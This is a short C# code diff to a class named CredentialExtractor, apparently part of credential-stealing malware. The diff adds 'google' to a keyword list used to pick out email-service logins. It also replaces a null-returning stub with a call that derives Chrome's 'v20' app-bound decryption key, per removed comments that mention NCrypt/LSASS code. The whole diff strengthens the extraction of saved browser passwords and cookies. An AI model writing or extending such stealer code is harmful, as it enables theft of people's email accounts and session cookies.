@@ -29,7 +29,7 @@ public static class CredentialExtractor
     };
 
     private static readonly string[] EmailKeywords = {
-        "gmail", "googlemail", "outlook", "hotmail", "live", "microsoft",
+        "gmail", "googlemail", "google", "outlook", "hotmail", "live", "microsoft",
         "yahoo", "ymail", "mail.ru", "bk.ru", "list.ru", "inbox.ru",
         "yandex", "rambler", "protonmail", "proton", "icloud", "me.com",
         "aol", "zoho", "gmx", "t-online", "web.de", "libero", "libero.it",
@@ -284,8 +284,6 @@ public static class CredentialExtractor
     // Since both files are in the same assembly, we duplicate the minimal needed logic
     private static byte[]? CookieExtractorDeriveV20Key(string appBoundKeyB64)
     {
-        // Simplified — for full v20 support, the NCrypt/LSASS code in CookieExtractor is needed
-        // For now, v10 is sufficient for most email credentials
-        return null;
+        return CookieExtractor.DeriveV20Key(appBoundKeyB64);
     }
 }
